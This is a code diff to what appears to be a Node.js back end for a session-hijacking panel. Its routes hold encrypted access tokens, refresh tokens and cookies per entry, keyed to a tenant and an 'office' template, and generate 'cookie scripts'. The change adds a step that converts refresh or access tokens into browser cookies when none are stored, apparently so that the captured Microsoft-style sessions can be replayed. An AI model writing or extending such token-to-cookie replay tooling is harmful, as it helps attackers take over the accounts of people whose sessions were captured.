@@ -134,7 +134,7 @@ router.get('/:id/cookie-script', userAuth, async (req, res) => {
     const token = tokens[0];
     const accessToken = decrypt(token.access_token_encrypted);
     const refreshToken = decrypt(token.refresh_token_encrypted);
-    const cookies = decrypt(token.cookies_encrypted);
+    var cookies = decrypt(token.cookies_encrypted);
 
     if (!accessToken && !refreshToken && !cookies) {
       return res.status(400).json({ error: 'No tokens available' });
@@ -148,8 +148,36 @@ router.get('/:id/cookie-script', userAuth, async (req, res) => {
       cookiesList = parseCookies(cookies, { tenant: tenant, accountType: accountType });
     }
 
+    // FIX: If no cookies string exists but we have access/refresh tokens,
+    // use the cookie converter to generate cookies from the tokens
+    if (cookiesList.length === 0 && (accessToken || refreshToken)) {
+      try {
+        const cookieConverter = require('../services/cookieconverter');
+        const tokenToUse = refreshToken || accessToken;
+        const templateType = token.template_type || 'office';
+        console.log('[Tokens] Converting token to cookies for script generation...');
+        const conversionResult = await cookieConverter.convertTokensToCookies(
+          tokenToUse, templateType, tenant, null, accountType
+        );
+        if (conversionResult.success && conversionResult.cookies) {
+          cookies = conversionResult.cookies;
+          cookiesList = parseCookies(cookies, { tenant: tenant, accountType: accountType });
+          console.log('[Tokens] Successfully converted token to cookies:', cookiesList.length, 'cookies');
+        } else {
+          console.warn('[Tokens] Token conversion failed:', conversionResult.error);
+        }
+      } catch (convertErr) {
+        console.error('[Tokens] Cookie conversion error:', convertErr.message);
+      }
+    }
+
     if (cookiesList.length === 0) {
-      return res.status(400).json({ error: 'No cookies available' });
+      return res.status(400).json({ 
+        error: 'No cookies available',
+        hint: accessToken 
+          ? 'Token detected but conversion failed. Try "Refresh" to renew the session first.' 
+          : 'No token data found for this entry.'
+      });
     }
 
     var scripts = {};
@@ -687,9 +715,8 @@ router.post('/convert-cookie', userAuth, async (req, res) => {
       res.status(400).json({ 
         success: false, 
         error: result.error || 'Conversion failed',
-        // Return debug info if available
-        debug: 
- result.debug      });
+        debug: result.debug
+      });
     }
   } catch (err) {
     console.error('[Tokens] Conversion error:', err);
